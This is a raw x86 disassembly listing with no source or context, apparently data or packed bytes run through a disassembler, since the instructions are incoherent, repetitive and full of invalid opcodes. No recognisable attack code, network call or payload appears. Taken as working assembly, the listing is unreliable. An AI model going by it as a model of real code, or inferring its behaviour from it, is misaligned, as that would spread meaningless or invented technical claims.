  418da1:	bound  esp,QWORD PTR [esi+0x0]
  418da4:	inc    eax
  418da5:	add    eax,0x5400000
  418daa:	inc    ecx
  418dab:	inc    eax
  418dac:	inc    eax
  418dad:	bound  esp,QWORD PTR ds:0x25050043
  418db3:	inc    ecx
  418db4:	inc    ebx
  418db5:	inc    eax
  418db6:	test   BYTE PTR [eax+0x0],al
  418db9:	bound  ebx,QWORD PTR [eax+0x62]
  418dbc:	inc    ecx
  418dbd:	inc    eax
  418dbe:	cmp    eax,DWORD PTR ds:0xadbcc210
  418dc4:	adc    al,0x71
  418dc6:	adc    al,0x86
  418dc8:	sub    BYTE PTR [ebx],ah
  418dca:	sub    BYTE PTR fs:[eax+0x7b],al
  418dce:	add    DWORD PTR [ecx],esp
  418dd0:	pushf  
  418dd1:	add    dh,0x42
  418dd4:	adc    edx,eax
  418dd6:	inc    esi
  418dd7:	stos   BYTE PTR es:[edi],al
  418dd8:	add    eax,0x401679c3
  418ddd:	xor    BYTE PTR [ebp+0x5],al
  418de0:	xchg   DWORD PTR [esi],ebx
  418de2:	inc    ecx
  418de3:	nop
  418de4:	push   cs
  418de5:	or     DWORD PTR [edx+0x62864486],edx
  418deb:	bound  eax,QWORD PTR [eax-0x70]
  418dee:	jg     0x418e18
  418df0:	push   edi
  418df1:	bound  ebp,QWORD PTR [eax+0x40]
  418df4:	or     DWORD PTR [edx+0x10],edi
  418df7:	bound  eax,QWORD PTR [eax+0x41]
  418dfa:	and    eax,0x40000500
  418dff:	inc    ebx
  418e00:	add    eax,0x40624041
  418e05:	inc    ebx
  418e06:	add    eax,0x43402541
  418e0b:	bound  eax,QWORD PTR [eax+0x43]
  418e0e:	int3   
  418e0f:	inc    eax
  418e10:	bound  eax,QWORD PTR [eax]
  418e12:	inc    ecx
  418e13:	inc    eax
  418e14:	inc    eax
  418e15:	add    eax,0x38a94005
  418e1a:	dec    eax
  418e1b:	test   al,0x30
  418e1d:	inc    eax
  418e1e:	inc    esp
  418e1f:	xor    al,0x5
  418e21:	lods   al,BYTE PTR ds:[esi]
  418e22:	or     BYTE PTR [esi+0x6c],ah
  418e25:	pop    ds
  418e26:	rcr    BYTE PTR [esi],1
  418e28:	xchg   BYTE PTR ds:0x40f901a0,al
  418e2e:	xor    eax,0x36871333
  418e33:	sub    al,0x43
  418e35:	adc    al,0x34
  418e37:	add    ch,BYTE PTR [eax-0x2e95d5e9]
  418e3d:	inc    eax
  418e3e:	inc    ecx
  418e3f:	adc    al,0x5
  418e41:	stos   DWORD PTR es:[edi],eax
  418e42:	xor    al,0xb4
  418e44:	arpl   WORD PTR [eax],dx
  418e46:	xor    dh,BYTE PTR [eax]
  418e48:	xchg   BYTE PTR [eax+0x4079051f],bh
  418e4e:	aaa    
  418e4f:	stos   BYTE PTR es:[edi],al
  418e50:	pusha  
  418e51:	add    eax,0x40626d26
  418e56:	and    eax,0x5406600
  418e5b:	inc    ebx
  418e5c:	inc    ecx
  418e5d:	inc    eax
  418e5e:	inc    eax
  418e5f:	inc    ebx
  418e60:	add    BYTE PTR [eax],al
  418e62:	add    BYTE PTR [edx-0x34],ah
  418e65:	inc    eax
  418e66:	add    eax,0x40004041
  418e6b:	inc    ecx
  418e6c:	int3   
  418e6d:	add    BYTE PTR [ebx-0x7c],al
  418e70:	add    eax,0x5406240
  418e75:	(bad)  
  418e76:	int    0x19
  418e78:	inc    edx
  418e79:	cmp    DWORD PTR [edi-0x259c9c35],esp
  418e7f:	inc    eax
  418e80:	aas    
  418e81:	int    0x5
  418e83:	inc    ebp
  418e84:	dec    ebx
  418e85:	pop    ecx
  418e86:	inc    ecx
  418e87:	adc    dl,al
  418e89:	pop    eax
  418e8a:	xchg   BYTE PTR [ebx+0x404a4090],ch
  418e90:	jno    0x418e23
  418e92:	and    eax,0x38adfeb4
  418e97:	add    esp,ebx
  418e99:	push   0x3
  418e9b:	or     eax,0x407867b8
  418ea0:	xchg   esp,eax
  418ea1:	inc    eax
  418ea2:	bound  ebx,QWORD PTR [eax+0x41]
  418ea5:	add    eax,0x40404340
  418eaa:	inc    ebx
  418eab:	inc    eax
  418eac:	test   BYTE PTR [eax],al
  418eae:	add    eax,0x40624041
  418eb3:	inc    eax
  418eb4:	add    BYTE PTR [edx+0x5],ah
  418eb7:	inc    ebx
  418eb8:	add    BYTE PTR [eax+0x78],al
  418ebb:	inc    ecx
  418ebc:	add    BYTE PTR [eax+0x41],bl
  418ebf:	bound  esi,QWORD PTR [ebp+0x40]
  418ec2:	leave  
  418ec3:	test   al,0x57
  418ec5:	inc    eax
  418ec6:	add    eax,0xa49fa17a
  418ecb:	adc    dh,BYTE PTR [ecx+esi*1]
  418ece:	inc    eax
  418ecf:	inc    edi
  418ed0:	xchg   edi,eax
  418ed1:	push   0x6cf7410d
  418ed6:	add    al,0x37
  418ed8:	dec    edi
  418ed9:	arpl   bp,cx
  418edb:	adc    BYTE PTR [esi+edx*4+0x5511d40],0x48
  418ee3:	ret    
  418ee4:	test   al,0x43
  418ee6:	inc    eax
  418ee7:	add    edx,DWORD PTR [esi]
  418ee9:	inc    eax
  418eea:	test   BYTE PTR [eax],al
  418eec:	int3   
  418eed:	bound  eax,QWORD PTR ds:0xcc840f41
  418ef3:	inc    ebx
  418ef4:	add    BYTE PTR [eax+0x0],al
  418ef7:	inc    eax
  418ef8:	inc    eax
  418ef9:	inc    eax
  418efa:	int3   
  418efb:	add    BYTE PTR ds:0x62404341,al
  418f01:	pop    eax
  418f02:	add    BYTE PTR [ebx+0x40],al
  418f05:	bound  ecx,QWORD PTR [edi]
  418f07:	inc    eax
  418f08:	xchg   BYTE PTR ds:0x40d1e848,dh
  418f0e:	adc    DWORD PTR [ecx],edx
  418f10:	and    eax,0xd5e34542
  418f15:	and    al,0xeb
  418f17:	jg     0x418ebd
  418f19:	dec    esp
  418f1a:	shl    BYTE PTR [ebx-0x31],0x40
  418f1e:	not    BYTE PTR [edx]
  418f20:	add    eax,0x72a343d
  418f25:	inc    eax
  418f26:	and    dl,BYTE PTR [edi]
  418f28:	xchg   bl,al
  418f2a:	bound  ebp,QWORD PTR [edx-0x11]
  418f2d:	inc    eax
  418f2e:	inc    ebx
  418f2f:	mov    esi,0xf9cb532c
  418f34:	sub    BYTE PTR [ebx],ah
  418f36:	xor    DWORD PTR [ebx+eiz*4+0x426233ab],edi
  418f3d:	add    BYTE PTR [eax],al
  418f3f:	inc    eax
  418f40:	inc    eax
  418f41:	cmovno eax,DWORD PTR ds:0x40056243
  418f48:	int3   
  418f49:	add    ah,cl
  418f4b:	inc    eax
  418f4c:	inc    eax
  418f4d:	bound  eax,QWORD PTR [ecx+0x0]
  418f50:	add    BYTE PTR [edi],cl
  418f52:	inc    ebx
  418f53:	inc    eax
  418f54:	inc    eax
  418f55:	add    BYTE PTR [ecx+0x43],al
  418f58:	add    eax,0x40256240
  418f5d:	bound  eax,QWORD PTR [eax]
  418f5f:	inc    eax
  418f60:	and    al,0xbf
  418f62:	add    eax,0xb47e9b4
  418f67:	inc    eax
  418f68:	xor    eax,DWORD PTR [eax-0x7a]
  418f6b:	add    eax,0x40c4ec62
  418f70:	dec    edx
  418f71:	inc    eax
  418f72:	and    eax,0x62b054c9
  418f77:	and    dh,BYTE PTR [eax+0x51]
  418f7a:	mov    ds:0x440524bc,al
  418f7f:	inc    eax
  418f80:	aaa    
  418f81:	je     0x418f88
  418f83:	add    eax,0x40505c38
  418f88:	inc    ebx
  418f89:	nop
  418f8a:	xchg   BYTE PTR ds:0x4140cc00,al
  418f90:	inc    eax
  418f91:	inc    ebx
  418f92:	bound  esp,QWORD PTR ds:0x41400043
  418f98:	add    BYTE PTR [eax],al
  418f9a:	add    eax,0x43624062
  418f9f:	inc    ecx
  418fa0:	inc    eax
  418fa1:	inc    eax
  418fa2:	inc    eax
  418fa3:	add    eax,0x40624340
  418fa8:	add    eax,0x40664140
  418fad:	int    0xc3
  418faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fb0:	imul   eax,DWORD PTR [eax+0x30],0xffffffae
  418fb4:	add    al,0x48
  418fb6:	jb     0x41900a
  418fb8:	lods   al,BYTE PTR ds:[esi]
  418fb9:	and    DWORD PTR [ebp+0x3a35a10a],ebx
  418fbf:	or     al,0xb3
  418fc1:	inc    eax
  418fc2:	and    al,0x40
  418fc4:	add    eax,0x43346441
  418fc9:	inc    eax
  418fca:	bswap  eax
  418fcc:	xchg   BYTE PTR [eax+esi*4-0x38],cl
  418fd0:	rol    BYTE PTR [eax+0x12],cl
  418fd3:	inc    eax
  418fd4:	pusha  
  418fd5:	push   eax
  418fd6:	adc    eax,0x2f508ad6
  418fdb:	inc    ebx
  418fdc:	add    BYTE PTR ds:0x41107840,al
  418fe2:	bound  eax,QWORD PTR [eax+0x40]
  418fe5:	sldt   WORD PTR [eax-0x34]
  418fe9:	js     0x41904d
  418feb:	add    eax,0x40664143
  418ff0:	inc    ebx
  418ff1:	add    BYTE PTR [ecx+0x5],al
  418ff4:	js     0x419036
  418ff6:	bound  eax,QWORD PTR [eax+0x0]
  418ff9:	inc    eax
  418ffa:	jle    0x418f9c
  418ffc:	inc    eax
  418ffd:	bound  ebp,QWORD PTR [edx+edi*2]
  419000:	inc    eax
  419001:	inc    edx
  419002:	and    eax,DWORD PTR ds:0xcfc4ae0e
  419008:	inc    eax
  419009:	rcl    BYTE PTR [ebp+0x66531086],cl
  41900f:	fiadd  DWORD PTR [eax+0x2b]
  419012:	inc    ecx
  419013:	and    eax,0x287bc567
  419018:	inc    esp
  419019:	inc    eax
  41901a:	pop    eax
  41901b:	lahf   
  41901c:	inc    eax
  41901d:	dec    esi
  41901e:	mov    edx,0x39234042
  419023:	inc    ecx
  419024:	inc    ebx
  419025:	inc    eax
  419026:	inc    eax
  419027:	add    eax,0x434162
  41902c:	inc    eax
  41902d:	add    BYTE PTR [edx+0x5],ah
  419030:	inc    eax
  419031:	adc    BYTE PTR [edx+0x40],ah
  419034:	inc    ebx
  419035:	inc    ecx
  419036:	add    eax,0x4340
  41903b:	add    eax,0x404162
  419040:	add    BYTE PTR [eax+0x43],al
  419043:	inc    eax
  419044:	add    eax,0xcde1a805
  419049:	add    eax,0x86516b40
  41904e:	add    eax,0x40942152
  419053:	adc    esi,DWORD PTR [ecx+0x34498638]
  419059:	bound  eax,QWORD PTR [ebx+0x11]
  41905c:	push   0x50cc149e
  419061:	inc    eax
  419062:	inc    eax
  419063:	inc    edx
  419064:	mov    bl,0x5
  419066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419067:	inc    eax
  419068:	add    BYTE PTR [eax],al
  41906a:	inc    ecx
  41906b:	inc    ebx
  41906c:	add    eax,0x41784062
  419071:	inc    eax
  419072:	inc    eax
  419073:	add    BYTE PTR [edi],cl
  419075:	bound  eax,QWORD PTR [ebx+0x0]
  419078:	add    eax,0x25006240
  41907d:	inc    eax
  41907e:	add    eax,0x40254143
  419083:	add    eax,0x57620000
  419088:	xor    BYTE PTR es:[eax-0xc],al
  41908c:	pop    ebx
  41908d:	xchg   BYTE PTR ds:0x406c8924,al
  419093:	and    al,BYTE PTR [ecx+0x25]
  419096:	xchg   BYTE PTR [esp+ecx*1],dh
  419099:	push   eax
  41909a:	inc    edx
  41909b:	jl     0x419070
  41909d:	popf   
  41909e:	adc    ebp,DWORD PTR [edx-0x4ebfbc9e]
  4190a4:	mov    dh,0x5
  4190a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190a7:	push   edi
  4190a8:	enter  0x40d1,0x42
  4190ac:	xrelease xchg BYTE PTR ds:0x400246c6,al
  4190b3:	xor    al,BYTE PTR [ebx+0x0]
  4190b6:	add    BYTE PTR [eax],al
  4190b8:	inc    ecx
  4190b9:	inc    eax
  4190ba:	bound  esp,QWORD PTR [esi+0x0]
  4190bd:	inc    eax
  4190be:	add    eax,0x5400000
  4190c3:	inc    ecx
  4190c4:	inc    eax
  4190c5:	inc    eax
  4190c6:	bound  esp,QWORD PTR ds:0x25050043
  4190cc:	inc    ecx
  4190cd:	inc    ebx
  4190ce:	inc    eax
  4190cf:	test   BYTE PTR [eax+0x0],al
  4190d2:	bound  ebx,QWORD PTR [eax+0x62]
  4190d5:	inc    ecx
  4190d6:	inc    eax
  4190d7:	dec    esp
  4190d8:	outs   dx,BYTE PTR ds:[esi]
  4190d9:	xchg   dh,bl
  4190db:	sub    DWORD PTR [ebx],esi
  4190dd:	inc    ecx
  4190de:	cmp    eax,0x680f9c72
  4190e3:	push   eax
  4190e4:	cmp    BYTE PTR [eax+0x41],al
  4190e7:	and    eax,DWORD PTR ds:0x6f1364a5
  4190ed:	inc    eax
  4190ee:	rol    BYTE PTR [ecx-0x7a],1
  4190f1:	add    eax,0x40419511
  4190f6:	jnp    0x41916e
  4190f8:	xchg   BYTE PTR cs:[eax+0x40414363],dh
  4190ff:	inc    ecx
  419100:	fwait
  419101:	adc    BYTE PTR [edx+0x40],ah
  419104:	inc    ecx
  419105:	and    eax,0x40000500
  41910a:	inc    ebx
  41910b:	add    eax,0x40624041
  419110:	inc    ebx
  419111:	add    eax,0x43402541
  419116:	bound  eax,QWORD PTR [eax+0x43]
  419119:	int3   
  41911a:	inc    eax
  41911b:	bound  eax,QWORD PTR [eax]
  41911d:	inc    ecx
  41911e:	inc    eax
  41911f:	inc    eax
  419120:	add    eax,0x440d1005
  419125:	xor    BYTE PTR [eax-0xc],al
  419128:	jg     0x41912f
  41912a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41912b:	(bad)  
  41912c:	sub    ch,BYTE PTR [eax+eax*2+0x2e]
  419130:	add    al,BYTE PTR [esi+0x40cc6205]
  419136:	inc    eax
  419137:	(bad)  
  419138:	aas    
  419139:	sub    DWORD PTR [esi+0x43317e91],eax
  41913f:	xchg   ecx,eax
  419140:	push   ebx
  419141:	call   0x3d40:0x6c636c40
  419148:	lahf   
  419149:	add    eax,0x6db062bf
  41914e:	inc    eax
  41914f:	push   ecx
  419150:	scas   eax,DWORD PTR es:[edi]
  419151:	xchg   BYTE PTR ds:0x40436015,al
  419157:	jge    0x4191ac
  419159:	sub    eax,0x254062
  41915e:	inc    ax
  419160:	add    eax,0x40404143
  419165:	inc    ebx
  419166:	add    BYTE PTR [eax],al
  419168:	add    BYTE PTR [edx-0x34],ah
  41916b:	inc    eax
  41916c:	add    eax,0x40004041
  419171:	inc    ecx
  419172:	int3   
  419173:	add    BYTE PTR [ebx-0x7c],al
  419176:	add    eax,0x5406240
  41917b:	bound  eax,QWORD PTR [esi+0x40d105cd]
  419181:	push   ecx
  419182:	lahf   
  419183:	cdq    
  419184:	adc    al,0xe5
  419186:	bound  edi,QWORD PTR [ebx+0x30]
  419189:	outs   dx,DWORD PTR ds:[esi]
  41918a:	add    eax,0x2aaebe05
  41918f:	xchg   edi,eax
  419190:	jmp    0x3c62:0x5863051
  419197:	mov    eax,ds:0x58624074
  41919c:	inc    ecx
  41919d:	add    eax,0x40404340
  4191a2:	inc    ebx
  4191a3:	inc    eax
  4191a4:	test   BYTE PTR [eax],al
  4191a6:	add    eax,0x40624041
  4191ab:	inc    eax
  4191ac:	add    BYTE PTR [edx+0x5],ah
  4191af:	inc    ebx
  4191b0:	add    BYTE PTR [eax+0x78],al
  4191b3:	inc    ecx
  4191b4:	add    BYTE PTR [eax+0x41],bl
  4191b7:	bound  esp,QWORD PTR [ecx]
  4191b9:	push   eax
  4191ba:	and    al,0x86
  4191bc:	sbb    DWORD PTR [edx+0x3b],esp
  4191bf:	std    
  4191c0:	aam    0xf
  4191c2:	cwde   
  4191c3:	add    eax,0xf741b020
  4191c8:	cmp    ecx,DWORD PTR [esi+0x5]
  4191cb:	mov    ebp,0xca470567
  4191d0:	push   ebp
  4191d1:	lock xchg BYTE PTR ds:0x8024877b,al
  4191d8:	shl    DWORD PTR [ebp+0x21],1
  4191db:	xchg   ah,dl
  4191dd:	hlt    
  4191de:	inc    eax
  4191df:	test   BYTE PTR [eax],al
  4191e1:	int3   
  4191e2:	bound  eax,QWORD PTR ds:0xcc840f41
  4191e8:	inc    ebx
  4191e9:	add    BYTE PTR [eax+0x0],al
  4191ec:	inc    eax
  4191ed:	inc    eax
  4191ee:	inc    eax
  4191ef:	int3   
  4191f0:	add    BYTE PTR ds:0x62404341,al
  4191f6:	pop    eax
  4191f7:	add    BYTE PTR [ebx+0x40],al
  4191fa:	bound  ecx,QWORD PTR [edi]
  4191fc:	inc    eax
  4191fd:	push   0x976d3d49
  419202:	pop    es
  419203:	call   FWORD PTR [ebx+0x37417140]
  419209:	add    eax,0x314e15bc
  41920e:	in     al,dx
  41920f:	pop    eax
  419210:	ins    DWORD PTR es:[edi],dx
  419211:	xchg   BYTE PTR ds:0x56c58d9,al
  419217:	cmp    DWORD PTR [edi],edi
  419219:	xor    eax,DWORD PTR [esi+0x490a5286]
  41921f:	pusha  
  419220:	jmp    0x4191b8
  419222:	push   edx
  419223:	push   edx
  419224:	dec    ecx
  419225:	inc    ebx
  419226:	(bad)  
  419227:	icebp  
  419228:	push   esp
  419229:	add    eax,0x6840
  41922e:	inc    eax
  41922f:	inc    eax
  419230:	cmovno eax,DWORD PTR ds:0x40056243
  419237:	int3   
  419238:	add    ah,cl
  41923a:	inc    eax
  41923b:	inc    eax
  41923c:	bound  eax,QWORD PTR [ecx+0x0]
  41923f:	add    BYTE PTR [edi],cl
  419241:	inc    ebx
  419242:	inc    eax
  419243:	inc    eax
  419244:	add    BYTE PTR [ecx+0x43],al
  419247:	add    eax,0x40256240
  41924c:	bound  eax,QWORD PTR [eax]
  41924e:	cmp    cl,dl
  419250:	add    al,BYTE PTR [ebx-0x1]
  419253:	xchg   BYTE PTR [esi],dl
  419255:	xor    BYTE PTR [eax+0x5413be7e],dl
  41925b:	xor    ebp,DWORD PTR [edi+ebp*4-0x41]
  41925f:	pop    ss
  419260:	inc    ecx
  419261:	inc    edx
  419262:	call   DWORD PTR [ebp-0x7363359e]
  419268:	inc    eax
  419269:	ja     0x4192bf
  41926b:	add    eax,0x531a9
  419270:	int3   
  419271:	inc    eax
  419272:	inc    ecx
  419273:	inc    eax
  419274:	inc    ebx
  419275:	bound  esp,QWORD PTR ds:0x41400043
  41927b:	add    BYTE PTR [eax],al
  41927d:	add    eax,0x43624062
  419282:	inc    ecx
  419283:	inc    eax
  419284:	inc    eax
  419285:	inc    eax
  419286:	add    eax,0x40624340
  41928b:	add    eax,0x40664140
  419290:	push   esi
  419291:	cli    
  419292:	inc    eax
  419293:	jne    0x419294
  419295:	xchg   BYTE PTR [eax+0x40286264],bh
  41929b:	jno    0x4192f1
  41929d:	ss or  eax,0x4c42c0a8
  4192a3:	inc    edx
  4192a4:	call   DWORD PTR [esi+edx*1+0x4066443d]
  4192ab:	push   eax
  4192ac:	xchg   ebx,eax
  4192ad:	add    eax,0x8829c163
  4192b2:	inc    eax
  4192b3:	sub    al,0x34
  4192b5:	xchg   BYTE PTR [eax+ebp*4+0x3],dl
  4192b9:	bound  eax,QWORD PTR [eax-0x2]
  4192bc:	es je  0x419302
  4192bf:	add    BYTE PTR ds:0x41107840,al
  4192c5:	bound  eax,QWORD PTR [eax+0x40]
  4192c8:	sldt   WORD PTR [eax-0x34]
  4192cc:	js     0x419330
  4192ce:	add    eax,0x40664143
  4192d3:	inc    ebx
  4192d4:	add    BYTE PTR [ecx+0x5],al
  4192d7:	js     0x419319
  4192d9:	bound  eax,QWORD PTR [eax+0x0]
  4192dc:	inc    eax
  4192dd:	inc    ecx
  4192de:	inc    ecx
  4192df:	test   al,0x40
  4192e1:	pop    eax
  4192e2:	dec    edx
  4192e3:	dec    ebx
  4192e4:	inc    eax
  4192e5:	std    
  4192e6:	pop    edx
  4192e7:	adc    dh,BYTE PTR [eax]
  4192e9:	inc    eax
  4192ea:	mov    dl,0xb0
  4192ec:	push   esi
  4192ed:	cmp    BYTE PTR [si+0x6c],bh
  4192f1:	inc    eax
  4192f2:	pop    ss
  4192f3:	mov    dh,0x34
  4192f5:	pop    ebx
  4192f6:	ins    DWORD PTR es:[edi],dx
  4192f7:	add    esp,DWORD PTR [edi]
  4192f9:	inc    eax
  4192fa:	outs   dx,BYTE PTR ds:[esi]
  4192fb:	mov    edx,0x6730dc6a
  419300:	inc    ebx
  419301:	push   esp
  419302:	jb     0x419356
  419304:	in     al,dx
  419305:	enter  0xacc0,0xd1
  419309:	inc    eax
  41930a:	xor    BYTE PTR [edx+0x40434153],dl
  419310:	inc    eax
  419311:	add    eax,0x434162
  419316:	inc    eax
  419317:	add    BYTE PTR [edx+0x5],ah
  41931a:	inc    eax
  41931b:	adc    BYTE PTR [edx+0x40],ah
  41931e:	inc    ebx
  41931f:	inc    ecx
  419320:	add    eax,0x4340
  419325:	add    eax,0x404162
  41932a:	add    BYTE PTR [eax+0x43],al
  41932d:	inc    eax
  41932e:	add    eax,0x21244498
  419333:	inc    eax
  419334:	push   0x2b
  419336:	xchg   DWORD PTR [ebp+esi*1-0x2],esp
  41933a:	mov    ds:0x4057d040,al
  41933f:	dec    ebp
  419340:	jbe    0x419302
  419342:	inc    esp
  419343:	push   eax
  419344:	xor    dh,BYTE PTR [ecx]
  419346:	inc    eax
  419347:	(bad)  [eax+0x4340cf62]
  41934d:	inc    edx
  41934e:	inc    ebx
  41934f:	inc    ecx
  419350:	adc    al,ah
  419352:	inc    eax
  419353:	add    BYTE PTR [eax],al
  419355:	inc    ecx
  419356:	inc    ebx
  419357:	add    eax,0x41784062
  41935c:	inc    eax
  41935d:	inc    eax
  41935e:	add    BYTE PTR [edi],cl
  419360:	bound  eax,QWORD PTR [ebx+0x0]
  419363:	add    eax,0x25006240
  419368:	inc    eax
  419369:	add    eax,0x40254143
  41936e:	add    eax,0x41620000
  419373:	inc    eax
  419374:	rcl    BYTE PTR [ebx],1
  419376:	dec    eax
  419377:	test   BYTE PTR [eax+0x4f],cl
  41937a:	inc    ebx
  41937b:	inc    eax
  41937c:	jle    0x4193d0
  41937e:	inc    edx
  41937f:	jns    0x4193c2
  419381:	nop
  419382:	xor    BYTE PTR [edx+ebp*8-0x70],cl
  419386:	xor    ah,BYTE PTR [eax]
  419388:	(bad)  
  419389:	cmp    al,BYTE PTR [ebx+0x0]
  41938c:	add    BYTE PTR [eax],al
  41938e:	inc    ecx
  41938f:	inc    eax
  419390:	bound  esp,QWORD PTR [esi+0x0]
  419393:	inc    eax
  419394:	add    eax,0x5400000
  419399:	inc    ecx
  41939a:	inc    eax
  41939b:	inc    eax
  41939c:	bound  esp,QWORD PTR ds:0x25050043
  4193a2:	inc    ecx
  4193a3:	inc    ebx
  4193a4:	inc    eax
  4193a5:	test   BYTE PTR [eax+0x0],al
  4193a8:	bound  ebx,QWORD PTR [eax+0x62]
  4193ab:	inc    ecx
  4193ac:	inc    eax
  4193ad:	pusha  
  4193ae:	inc    eax
  4193af:	jns    0x4193d6
  4193b1:	jl     0x41941b
  4193b3:	test   al,0x9b
  4193b5:	inc    eax
  4193b6:	inc    eax
  4193b7:	repnz inc edx
  4193b9:	arpl   WORD PTR [ebx+eiz*2-0x44],sp
  4193bd:	xor    DWORD PTR [eax+0x34],eax
  4193c0:	mov    edi,0x629b05c8
  4193c5:	ins    BYTE PTR es:[edi],dx
  4193c6:	dec    eax
  4193c7:	inc    esp
  4193c8:	dec    ecx
  4193c9:	cwde   
  4193ca:	inc    ecx
  4193cb:	mov    eax,ss
  4193cd:	les    eax,FWORD PTR [eax+0x72]
  4193d0:	xchg   ebx,eax
  4193d1:	arpl   WORD PTR [ebp+0x40434563],ax
  4193d7:	jl     0x4193d4
  4193d9:	inc    ecx
  4193da:	push   0x40d12dd8
  4193df:	inc    ecx
  4193e0:	inc    edx
  4193e1:	in     al,0x92
  4193e3:	aam    0x26
  4193e5:	adc    BYTE PTR [edx+0x40],ah
  4193e8:	inc    ecx
  4193e9:	and    eax,0x40000500
  4193ee:	inc    ebx
  4193ef:	add    eax,0x40624041
  4193f4:	inc    ebx
  4193f5:	add    eax,0x43402541
  4193fa:	bound  eax,QWORD PTR [eax+0x43]
  4193fd:	int3   
  4193fe:	inc    eax
  4193ff:	bound  eax,QWORD PTR [eax]
  419401:	inc    ecx
  419402:	inc    eax
  419403:	inc    eax
  419404:	add    eax,0xd2445305
  419409:	xor    eax,0x2a644e88
  41940e:	jg     0x419450
  419410:	jle    0x419456
  419412:	test   al,0x25
  419414:	jns    0x419437
  419416:	ror    DWORD PTR [eax+0x70],cl
  419419:	adc    DWORD PTR [esi+0x24],eax
  41941c:	fsub   DWORD PTR [edx+0x40]
  41941f:	and    eax,0x5406600
  419424:	inc    ebx
  419425:	inc    ecx
  419426:	inc    eax
  419427:	inc    eax
  419428:	inc    ebx
  419429:	add    BYTE PTR [eax],al
  41942b:	add    BYTE PTR [edx-0x34],ah
  41942e:	inc    eax
  41942f:	add    eax,0x40004041
  419434:	inc    ecx
  419435:	int3   
  419436:	add    BYTE PTR [ebx-0x7c],al
  419439:	add    eax,0x5406240
  41943e:	bound  esp,QWORD PTR [ebx+0x57]
  419441:	inc    eax
  419442:	(bad)  
  419443:	inc    ebx
  419444:	inc    ecx
  419445:	or     eax,0x40415d63
  41944a:	jl     0x41941f
  41944c:	xchg   DWORD PTR [ecx],esp
  41944e:	cwde   
  41944f:	and    BYTE PTR [ebx+0x40],al
  419452:	jmp    0x303e:0x20629242
  419459:	inc    eax
  41945a:	mov    esi,0x6771a8b1
  41945f:	xor    al,0x5c
  419461:	inc    eax
  419462:	mov    edi,0x58624050
  419467:	inc    ecx
  419468:	add    eax,0x40404340
  41946d:	inc    ebx
  41946e:	inc    eax
  41946f:	test   BYTE PTR [eax],al
  419471:	add    eax,0x40624041
  419476:	inc    eax
  419477:	add    BYTE PTR [edx+0x5],ah
  41947a:	inc    ebx
  41947b:	add    BYTE PTR [eax+0x78],al
  41947e:	inc    ecx
  41947f:	add    BYTE PTR [eax+0x41],bl
  419482:	bound  eax,QWORD PTR [ebp-0x1c]
  419485:	inc    esi
  419486:	cs inc eax
  419488:	inc    eax
  419489:	inc    eax
  41948a:	mov    edi,0xe438a841
  41948f:	xor    DWORD PTR [eax+0x40],eax
  419492:	inc    eax
  419493:	xchg   DWORD PTR [ecx],edx
  419495:	sbb    al,0x62
  419497:	ins    BYTE PTR es:[edi],dx
  419498:	inc    eax
  419499:	pop    edi
  41949a:	xor    ebx,DWORD PTR [esp+ecx*2+0x40e13ea8]
  4194a1:	mov    ?,WORD PTR [edi-0x58]
  4194a4:	or     eax,0x404a84c1
  4194a9:	xor    al,0x9b
  4194ab:	inc    esp
  4194ac:	retf   
  4194ad:	inc    esi
  4194ae:	data16 (bad) 
  4194b1:	ins    BYTE PTR es:[edi],dx
  4194b2:	sub    DWORD PTR [edx],0x40
  4194b5:	test   BYTE PTR [eax],al
  4194b7:	int3   
  4194b8:	bound  eax,QWORD PTR ds:0xcc840f41
  4194be:	inc    ebx
  4194bf:	add    BYTE PTR [eax+0x0],al
  4194c2:	inc    eax
  4194c3:	inc    eax
  4194c4:	inc    eax
  4194c5:	int3   
  4194c6:	add    BYTE PTR ds:0x62404341,al
  4194cc:	pop    eax
  4194cd:	add    BYTE PTR [ebx+0x40],al
  4194d0:	bound  ecx,QWORD PTR [edi]
  4194d2:	inc    eax
  4194d3:	inc    esp
  4194d4:	(bad)  
  4194d5:	cld    
  4194d6:	or     al,0xf5
  4194d8:	inc    eax
  4194d9:	mov    ah,0x44
  4194db:	jecxz  0x419549
  4194dd:	(bad)  
  4194de:	retf   0xfc80
  4194e1:	mov    edi,0xe2343042
  4194e6:	sbb    esp,edi
  4194e8:	mov    bh,0x68
  4194ea:	test   DWORD PTR [esi+0x1d],0x6476228
  4194f1:	and    eax,0x917838c4
  4194f6:	inc    ecx
  4194f7:	retf   
  4194f8:	ja     0x41956d
  4194fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194fb:	les    ebx,FWORD PTR [edx-0x41]
  4194fe:	inc    ebx
  4194ff:	ds dec ecx
  419501:	inc    esp
  419502:	test   al,0x40
  419504:	les    eax,FWORD PTR [eax+0x30]
  419507:	dec    ecx
  419508:	nop
  419509:	jo     0x41954c
  41950b:	inc    ebx
  41950c:	dec    edi
  41950d:	inc    eax
  41950e:	pop    eax
  41950f:	jecxz  0x419511
  419511:	add    BYTE PTR [eax+0x40],al
  419514:	cmovno eax,DWORD PTR ds:0x40056243
  41951b:	int3   
  41951c:	add    ah,cl
  41951e:	inc    eax
  41951f:	inc    eax
  419520:	bound  eax,QWORD PTR [ecx+0x0]
  419523:	add    BYTE PTR [edi],cl
  419525:	inc    ebx
  419526:	inc    eax
  419527:	inc    eax
  419528:	add    BYTE PTR [ecx+0x43],al
  41952b:	add    eax,0x40256240
  419530:	bound  eax,QWORD PTR [eax]
  419532:	add    al,0x3
  419534:	sub    al,BYTE PTR [eax+0x40]
  419537:	inc    edx
  419538:	inc    eax
  419539:	jge    0x41957b
  41953b:	inc    ecx
  41953c:	lods   al,BYTE PTR ds:[esi]
  41953d:	sub    BYTE PTR [eax+0x60],cl
  419540:	xor    DWORD PTR [eax-0x70],ecx
  419543:	ror    ebx,1
  419545:	inc    eax
  419546:	inc    ecx
  419547:	inc    ebx
  419548:	ins    BYTE PTR es:[edi],dx
  419549:	sub    al,BYTE PTR [ebx]
  41954b:	dec    esi
  41954c:	add    eax,0x4140cc00
  419551:	inc    eax
  419552:	inc    ebx
  419553:	bound  esp,QWORD PTR ds:0x41400043
  419559:	add    BYTE PTR [eax],al
  41955b:	add    eax,0x43624062
  419560:	inc    ecx
  419561:	inc    eax
  419562:	inc    eax
  419563:	int3   
  419564:	int3   
  419565:	int3   
  419566:	int3   
  419567:	int3   
  419568:	int3   
  419569:	int3   
